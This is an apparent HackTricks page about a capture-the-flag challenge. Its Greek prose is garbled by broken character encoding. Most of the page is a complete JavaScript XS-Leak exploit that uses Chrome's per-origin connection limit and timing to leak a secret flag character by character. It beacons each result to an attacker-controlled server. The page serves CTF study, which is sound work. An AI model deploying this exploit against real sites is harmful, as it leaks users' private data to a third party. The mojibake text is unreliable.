# Connection Pool by Destination Example

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Î£Ï„Î¿ [**Î±Ï…Ï„ÏŒ Ï„Î¿ exploit**](https://gist.github.com/terjanq/0bc49a8ef52b0e896fca1ceb6ca6b00e#file-safelist-html), [**@terjanq**](https://twitter.com/terjanq) Ï€ÏÎ¿Ï„ÎµÎ¯Î½ÎµÎ¹ Î¬Î»Î»Î· Î¼Î¹Î± Î»ÏÏƒÎ· Î³Î¹Î± Ï„Î·Î½ Ï€ÏÏŒÎºÎ»Î·ÏƒÎ· Ï€Î¿Ï… Î±Î½Î±Ï†Î­ÏÎµÏ„Î±Î¹ ÏƒÏ„Î·Î½ ÎµÏ€ÏŒÎ¼ÎµÎ½Î· ÏƒÎµÎ»Î¯Î´Î±:

{% content-ref url="connection-pool-by-destination-example.md" %}
[connection-pool-by-destination-example.md](connection-pool-by-destination-example.md)
{% endcontent-ref %}

Î‘Ï‚ Î´Î¿ÏÎ¼Îµ Ï€ÏÏ‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Î±Ï…Ï„ÏŒ Ï„Î¿ exploit:

* ÎŸ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹ Î¼Î¹Î± ÏƒÎ·Î¼ÎµÎ¯Ï‰ÏƒÎ· Î¼Îµ ÏŒÏƒÎ¿ Ï„Î¿ Î´Ï…Î½Î±Ï„ÏŒÎ½ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ **`<img`** ÎµÏ„Î¹ÎºÎ­Ï„ÎµÏ‚ **Ï†ÏŒÏÏ„Ï‰ÏƒÎ·Ï‚** **`/js/purify.js`** (Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î±Ï€ÏŒ 6 Î³Î¹Î± Î½Î± Î¼Ï€Î»Î¿ÎºÎ¬ÏÎµÎ¹ Ï„Î·Î½ Ï€ÏÎ¿Î­Î»ÎµÏ…ÏƒÎ·).
* Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± **Î±Ï†Î±Î¹ÏÎ­ÏƒÎµÎ¹** Ï„Î· **ÏƒÎ·Î¼ÎµÎ¯Ï‰ÏƒÎ·** Î¼Îµ Î´ÎµÎ¯ÎºÏ„Î· 1.
* Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± \[ÎºÎ¬Î½ÎµÎ¹ Ï„Î¿ **bot Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î· ÏƒÎµÎ»Î¯Î´Î±** Î¼Îµ Ï„Î· Î¸Ï…Î¼ÏŒÎ¼ÎµÎ½Î· ÏƒÎ·Î¼ÎµÎ¯Ï‰ÏƒÎ·] ÎºÎ±Î¹ Î¸Î± ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ Î­Î½Î± **Î±Î¯Ï„Î·Î¼Î±** ÏƒÏ„Î¿ **`victim.com/js/purify.js`** Ï€Î¿Ï… Î¸Î± **Ï‡ÏÎ¿Î½Î¯ÏƒÎµÎ¹**.&#x20;
* Î‘Î½ Î¿ Ï‡ÏÏŒÎ½Î¿Ï‚ ÎµÎ¯Î½Î±Î¹ **Î¼ÎµÎ³Î±Î»ÏÏ„ÎµÏÎ¿Ï‚**, Î· **ÎµÎ¹ÏƒÎ±Î³Ï‰Î³Î®** Î®Ï„Î±Î½ ÏƒÏ„Î· **ÏƒÎ·Î¼ÎµÎ¯Ï‰ÏƒÎ·** Ï€Î¿Ï… Î­Î¼ÎµÎ¹Î½Îµ, Î±Î½ Î¿ Ï‡ÏÏŒÎ½Î¿Ï‚ ÎµÎ¯Î½Î±Î¹ **Î¼Î¹ÎºÏÏŒÏ„ÎµÏÎ¿Ï‚**, Î· **ÏƒÎ·Î¼Î±Î¯Î±** Î®Ï„Î±Î½ ÎµÎºÎµÎ¯.

{% hint style="info" %}
Î•Î¹Î»Î¹ÎºÏÎ¹Î½Î¬, Î´Î¹Î±Î²Î¬Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿, Î¼Î¿Ï… Î­Î»ÎµÎ¹Ï€Îµ ÎºÎ¬Ï€Î¿Î¹Î¿ Î¼Î­ÏÎ¿Ï‚ ÏŒÏ€Î¿Ï… Î¿ **ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ ÎºÎ¬Î½ÎµÎ¹ Ï„Î¿ bot Î½Î± Ï†Î¿ÏÏ„ÏÏƒÎµÎ¹ Ï„Î· ÏƒÎµÎ»Î¯Î´Î± Î³Î¹Î± Î½Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¹Ï‚ ÎµÏ„Î¹ÎºÎ­Ï„ÎµÏ‚ img**, Î´ÎµÎ½ Î²Î»Î­Ï€Ï‰ Ï„Î¯Ï€Î¿Ï„Î± Ï„Î­Ï„Î¿Î¹Î¿ ÏƒÏ„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ±.
{% endhint %}
```html
<html>
<head>
<script>
const SITE_URL = 'https://safelist.ctf.sekai.team/';
const PING_URL = 'https://myserver';
function timeScript(){
return new Promise(resolve => {
var x = document.createElement('script');
x.src = 'https://safelist.ctf.sekai.team/js/purify.js?' + Math.random();
var start = Date.now();
x.onerror = () => {
console.log(`Time: ${Date.now() - start}`); //Time request
resolve(Date.now() - start);
x.remove();
}
document.body.appendChild(x);
});
}

add_note = async (note) => {
let x = document.createElement('form')
x.action = SITE_URL + "create"
x.method = "POST"
x.target = "xxx"

let i = document.createElement("input");
i.type = "text"
i.name = "text"
i.value = note
x.appendChild(i)
document.body.appendChild(x)
x.submit()
}

remove_note = async (note_id) => {
let x = document.createElement('form')
x.action = SITE_URL+"remove"
x.method = "POST"
x.target = "_blank"

let i = document.createElement("input");
i.type = "text"
i.name = "index"
i.value = note_id
x.appendChild(i)
document.body.appendChild(x)
x.submit()
}

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
// }zyxwvutsrqponmlkjihgfedcba_
const alphabet = 'zyxwvutsrqponmlkjihgfedcba_'
var prefix = 'SEKAI{xsleakyay';
const TIMEOUT = 500;
async function checkLetter(letter){
// Chrome puts a limit of 6 concurrent request to the same origin. We are creating a lot of images pointing to purify.js
// Depending whether we found flag's letter it will either load the images or not.
// With timing, we can detect whether Chrome is processing purify.js or not from our site and hence leak the flag char by char.
const payload = `${prefix}${letter}` + Array.from(Array(78)).map((e,i)=>`<img/src=/js/purify.js?${i}>`).join('');
await add_note(payload);
await sleep(TIMEOUT);
await timeScript();
await remove_note(1); //Now, only the note with the flag or with the injection existsh
await sleep(TIMEOUT);
const time = await timeScript(); //Find out how much a request to the same origin takes
navigator.sendBeacon(PING_URL, [letter,time]);
if(time>100){
return 1;
}
return 0;
}
window.onload = async () => {
navigator.sendBeacon(PING_URL, 'start');
// doesnt work because we are removing flag after success.
// while(1){
for(const letter of alphabet){
if(await checkLetter(letter)){
prefix += letter;
navigator.sendBeacon(PING_URL, prefix);
break;
}
}
// }
};
</script>
</head>
<body>
</body>
</html>

```
{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
